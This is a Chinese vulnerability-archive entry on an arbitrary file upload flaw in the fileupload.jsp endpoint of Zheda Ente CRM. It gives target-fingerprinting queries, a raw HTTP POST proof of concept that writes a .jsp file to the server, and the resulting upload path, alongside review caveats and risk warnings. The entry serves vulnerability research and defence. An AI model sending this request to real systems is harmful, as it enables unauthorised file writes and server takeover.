---
source: "wy876 漏洞文库"
title: "浙大恩特CRM entereditor fileupload.jsp任意文件写入"
product: "浙大恩特CRM"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "entsoft_en部署路径及JSP解析，版本未知"
prerequisites: "两同名JSESSIONID，身份不清"
side_effects: "请求可能删除/覆盖数据、修改账号或持久改变业务状态；文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/gpf53pls4igr823a"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E6%B5%99%E5%A4%A7%E6%81%A9%E7%89%B9CRM/%E6%B5%99%E5%A4%A7%E6%81%A9%E7%89%B9CRMfileupload.jsp%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "app.name="
hunter: "app.name=\"浙大恩特 CRM\""
id: "vw-597be917e46bfc11e0d8d039"
entity_id: "ve-597be917e46bfc11e0d8d039"
schema_version: "1"
---

# 浙大恩特CRM entereditor fileupload.jsp任意文件写入

## 条目说明

- 对象与具体问题：浙大恩特CRM；entereditor fileupload.jsp任意文件写入
- 版本、配置及部署条件：entsoft_en部署路径及JSP解析，版本未知
- 认证与权限前提：两同名JSESSIONID，身份不清
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- body test不是执行证据，只有filename=jsp及推定路径，不能认服务器控制已证
- 重复SessionCookie歧义，英文版上下文与/enterdoc共享目录需环境说明
- 固定文件名可能覆盖，补输出/清理、修复和版本

## 操作风险

请求可能删除/覆盖数据、修改账号或持久改变业务状态；文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
浙大恩特CRM是由浙江大学恩智浙大科技有限公司推出的客户关系管理（CRM）系统。该系统旨在帮助企业高效管理客户关系，提升销售业绩，促进市场营销和客户服务的优化。系统支持客户数据分析和报表展示，帮助企业深度挖掘客户数据，提供决策参考。浙大恩特CRM fileupload.jsp存在任意文件上传漏洞，攻击者可通过该漏洞获取服务器控制权限。

## 二、影响版本
+ 浙大恩特CRM

## 三、资产测绘
+ hunter`app.name="浙大恩特 CRM"`
+ 特征


## 四、漏洞复现
```http
POST /entsoft_en/entereditor/jsp/fileupload.jsp?filename=123123.jsp HTTP/1.1
Host: xx.xx.xx.xx
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=2******************************3; JSESSIONID=1******************************5
Connection: close
Content-Type: application/x-www-form-urlencoded

test
```

> 请求长度说明：原资料 Content-Length 为 4；静态长度已移除，应由客户端根据最终请求体的字节数生成。


上传文件位置

```plain
	/enterdoc/uploadfile/123123.jsp
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gpf53pls4igr823a>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
